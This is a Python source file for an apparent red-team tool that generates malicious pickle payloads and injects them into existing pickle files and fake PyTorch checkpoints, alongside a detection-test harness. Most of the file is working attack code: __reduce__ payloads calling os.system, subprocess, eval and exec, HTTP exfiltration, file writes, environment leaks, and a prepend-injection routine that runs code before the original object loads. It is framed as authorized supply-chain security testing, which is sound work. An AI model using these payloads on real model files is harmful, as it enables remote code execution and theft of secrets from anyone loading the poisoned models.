"""
Pickle Payload Injector - Red Team Tool for ML Model Supply Chain Testing

Based on Trail of Bits fickling injection capabilities:
- PyTorch model payload injection
- TorchScript payload support
- RCE payload generation
- Supply chain attack simulation

Part of SENTINEL Strike Red Team Toolkit.

Author: SENTINEL Team
Engine ID: 190

WARNING: This tool is for authorized security testing only.
"""

import logging
import pickle
import pickletools
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple, Union
from io import BytesIO
import struct

logger = logging.getLogger("PicklePayloadInjector")


# ============================================================================
# Payload Types
# ============================================================================

class PayloadType(Enum):
    """Types of pickle payloads for testing."""
    RCE_SYSTEM = "rce_system"           # os.system() execution
    RCE_SUBPROCESS = "rce_subprocess"   # subprocess.call() execution
    RCE_EVAL = "rce_eval"               # eval() execution
    DATA_EXFIL = "data_exfil"           # Data exfiltration via HTTP
    REVERSE_SHELL = "reverse_shell"     # Reverse shell connection
    FILE_WRITE = "file_write"           # Write file to disk
    ENV_LEAK = "env_leak"               # Leak environment variables
    CANARY = "canary"                   # Benign canary for detection testing


# ============================================================================
# Payload Classes
# ============================================================================

class BasePayload:
    """
    Base class for pickle payloads using __reduce__.
    
    Python's pickle protocol calls __reduce__ during serialization
    and executes the returned callable during deserialization.
    """
    
    def __reduce__(self) -> Tuple[Callable, Tuple]:
        raise NotImplementedError("Subclasses must implement __reduce__")


class SystemCommandPayload(BasePayload):
    """Execute system command via os.system()."""
    
    def __init__(self, command: str = "id"):
        self.command = command
    
    def __reduce__(self):
        import os
        return (os.system, (self.command,))


class SubprocessPayload(BasePayload):
    """Execute command via subprocess.call()."""
    
    def __init__(self, args: List[str] = None):
        self.args = args or ["id"]
    
    def __reduce__(self):
        import subprocess
        return (subprocess.call, (self.args,))


class EvalPayload(BasePayload):
    """Execute Python code via eval()."""
    
    def __init__(self, code: str = "__import__('os').getcwd()"):
        self.code = code
    
    def __reduce__(self):
        return (eval, (self.code,))


class ExecPayload(BasePayload):
    """Execute Python statements via exec()."""
    
    def __init__(self, code: str = "print('SENTINEL_CANARY')"):
        self.code = code
    
    def __reduce__(self):
        return (exec, (self.code,))


class HTTPExfilPayload(BasePayload):
    """Exfiltrate data via HTTP request."""
    
    def __init__(self, url: str = "http://localhost:8080/exfil", data: str = "test"):
        self.url = url
        self.data = data
    
    def __reduce__(self):
        import urllib.request
        return (
            urllib.request.urlopen,
            (f"{self.url}?data={self.data}",)
        )


class FileWritePayload(BasePayload):
    """Write file to disk."""
    
    def __init__(self, path: str = "/tmp/sentinel_test", content: str = "PWNED"):
        self.path = path
        self.content = content
    
    def __reduce__(self):
        # Use exec to write file
        code = f"open('{self.path}', 'w').write('{self.content}')"
        return (exec, (code,))


class EnvLeakPayload(BasePayload):
    """Leak environment variables."""
    
    def __reduce__(self):
        import os
        return (os.environ.copy, ())


class CanaryPayload(BasePayload):
    """
    Benign canary payload for testing detection capabilities.
    
    Does not execute anything harmful - just returns a marker string.
    """
    
    def __init__(self, marker: str = "SENTINEL_CANARY_TRIGGERED"):
        self.marker = marker
    
    def __reduce__(self):
        # Returns a harmless lambda that returns the marker
        return (lambda m: m, (self.marker,))


# ============================================================================
# Data Classes
# ============================================================================

@dataclass
class InjectionResult:
    """Result of payload injection."""
    success: bool
    payload_type: PayloadType
    payload_bytes: bytes
    original_size: int
    injected_size: int
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "success": self.success,
            "payload_type": self.payload_type.value,
            "payload_size": len(self.payload_bytes),
            "size_increase": self.injected_size - self.original_size,
            "metadata": self.metadata,
        }


# ============================================================================
# Main Pickle Payload Injector
# ============================================================================

class PicklePayloadInjector:
    """
    Red Team tool for ML model supply chain attack simulation.
    
    Generates malicious pickle payloads for testing:
    - Detection engine validation
    - Supply chain security auditing
    - ML model integrity verification
    """
    
    PAYLOAD_CLASSES = {
        PayloadType.RCE_SYSTEM: SystemCommandPayload,
        PayloadType.RCE_SUBPROCESS: SubprocessPayload,
        PayloadType.RCE_EVAL: EvalPayload,
        PayloadType.DATA_EXFIL: HTTPExfilPayload,
        PayloadType.FILE_WRITE: FileWritePayload,
        PayloadType.ENV_LEAK: EnvLeakPayload,
        PayloadType.CANARY: CanaryPayload,
    }
    
    def __init__(self, protocol: int = 4):
        """
        Initialize injector.
        
        Args:
            protocol: Pickle protocol version (0-5)
        """
        self.protocol = protocol
    
    def generate_payload(
        self,
        payload_type: PayloadType,
        **kwargs
    ) -> bytes:
        """
        Generate malicious pickle payload.
        
        Args:
            payload_type: Type of payload to generate
            **kwargs: Arguments for payload class
            
        Returns:
            Serialized pickle bytes
        """
        if payload_type not in self.PAYLOAD_CLASSES:
            raise ValueError(f"Unknown payload type: {payload_type}")
        
        payload_class = self.PAYLOAD_CLASSES[payload_type]
        payload = payload_class(**kwargs)
        
        return pickle.dumps(payload, protocol=self.protocol)
    
    def generate_all_payloads(self) -> Dict[PayloadType, bytes]:
        """Generate all payload types for testing."""
        payloads = {}
        
        for payload_type in PayloadType:
            try:
                payloads[payload_type] = self.generate_payload(payload_type)
            except Exception as e:
                logger.warning(f"Failed to generate {payload_type}: {e}")
        
        return payloads
    
    def inject_into_pickle(
        self,
        original: bytes,
        payload_type: PayloadType,
        **kwargs
    ) -> InjectionResult:
        """
        Inject payload into existing pickle data.
        
        Prepends payload to original pickle, causing RCE before
        the original object is loaded.
        
        Args:
            original: Original pickle bytes
            payload_type: Type of payload to inject
            **kwargs: Payload arguments
            
        Returns:
            InjectionResult with modified pickle
        """
        payload_bytes = self.generate_payload(payload_type, **kwargs)
        
        # Strategy: Pickle allows multiple objects in one stream
        # We prepend our payload, it gets executed first
        # Then POP it off the stack and continue with original
        
        # Remove STOP opcode from payload (0x2e = '.')
        if payload_bytes.endswith(b'.'):
            payload_without_stop = payload_bytes[:-1]
        else:
            payload_without_stop = payload_bytes
        
        # Add POP opcode (0x30 = '0') to discard result
        # Then append original pickle
        injected = payload_without_stop + b'0' + original
        
        return InjectionResult(
            success=True,
            payload_type=payload_type,
            payload_bytes=injected,
            original_size=len(original),
            injected_size=len(injected),
            metadata={
                "protocol": self.protocol,
                "injection_strategy": "prepend",
            },
        )
    
    def analyze_pickle(self, data: bytes) -> Dict[str, Any]:
        """
        Analyze pickle structure for security assessment.
        
        Returns:
            Analysis dictionary with opcodes and risk indicators
        """
        output = BytesIO()
        pickletools.dis(BytesIO(data), output)
        disassembly = output.getvalue().decode('utf-8', errors='replace')
        
        # Count dangerous opcodes
        dangerous_ops = {
            'GLOBAL': disassembly.count('GLOBAL'),
            'STACK_GLOBAL': disassembly.count('STACK_GLOBAL'),
            'REDUCE': disassembly.count('REDUCE'),
            'BUILD': disassembly.count('BUILD'),
            'INST': disassembly.count('INST'),
        }
        
        # Check for dangerous modules
        dangerous_modules = []
        for line in disassembly.split('\n'):
            if 'GLOBAL' in line or 'STACK_GLOBAL' in line:
                for module in ['os', 'subprocess', 'builtins', 'nt', 'posix']:
                    if module in line:
                        dangerous_modules.append(module)
        
        return {
            "size": len(data),
            "protocol": self._detect_protocol(data),
            "opcodes": dangerous_ops,
            "dangerous_modules": list(set(dangerous_modules)),
            "disassembly_preview": disassembly[:500],
        }
    
    def _detect_protocol(self, data: bytes) -> int:
        """Detect pickle protocol version."""
        if len(data) < 2:
            return 0
        
        if data[0:1] == b'\x80':
            return data[1]
        
        return 0  # Protocol 0 or 1
    
    def create_pytorch_payload(
        self,
        payload_type: PayloadType = PayloadType.CANARY,
        **kwargs
    ) -> bytes:
        """
        Create payload that mimics PyTorch model structure.
        
        Useful for testing ML model loading pipelines.
        """
        # Create a dict that looks like a PyTorch state_dict
        # but includes our payload
        
        payload_obj = self.PAYLOAD_CLASSES[payload_type](**kwargs)
        
        fake_model = {
            "model_state_dict": {
                "layer1.weight": [1.0, 2.0, 3.0],
                "layer1.bias": [0.1, 0.2, 0.3],
            },
            "optimizer_state_dict": {},
            "epoch": 100,
            "_sentinel_payload": payload_obj,  # Hidden payload
        }
        
        return pickle.dumps(fake_model, protocol=self.protocol)


# ============================================================================
# Strike Integration
# ============================================================================

class SupplyChainAttackSimulator:
    """
    High-level interface for supply chain attack simulation.
    
    For use in SENTINEL Strike offensive testing.
    """
    
    def __init__(self):
        self.injector = PicklePayloadInjector()
    
    def test_detection_engine(
        self,
        engine_func: Callable[[bytes], Any]
    ) -> Dict[str, Any]:
        """
        Test a detection engine against all payload types.
        
        Args:
            engine_func: Function that takes pickle bytes and returns result
            
        Returns:
            Test results for each payload type
        """
        results = {}
        
        for payload_type in PayloadType:
            try:
                payload = self.injector.generate_payload(payload_type)
                detection_result = engine_func(payload)
                
                results[payload_type.value] = {
                    "detected": bool(detection_result),
                    "payload_size": len(payload),
                    "result": str(detection_result)[:200],
                }
            except Exception as e:
                results[payload_type.value] = {
                    "error": str(e),
                }
        
        return results
    
    def generate_test_suite(self) -> List[Tuple[str, bytes]]:
        """
        Generate complete test suite for supply chain detection.
        
        Returns:
            List of (name, payload_bytes) tuples
        """
        test_cases = []
        
        # Basic payloads
        for payload_type in PayloadType:
            payload = self.injector.generate_payload(payload_type)
            test_cases.append((
                f"basic_{payload_type.value}",
                payload,
            ))
        
        # Nested payload in dict
        nested = self.injector.create_pytorch_payload(PayloadType.CANARY)
        test_cases.append(("nested_pytorch_model", nested))
        
        # Multiple payloads
        multi = pickle.dumps({
            "p1": SystemCommandPayload("id"),
            "p2": EvalPayload("1+1"),
        })
        test_cases.append(("multi_payload", multi))
        
        return test_cases


# ============================================================================
# Module Exports
# ============================================================================

__all__ = [
    "PicklePayloadInjector",
    "SupplyChainAttackSimulator",
    "PayloadType",
    "InjectionResult",
    "BasePayload",
    "SystemCommandPayload",
    "SubprocessPayload",
    "EvalPayload",
    "CanaryPayload",
]
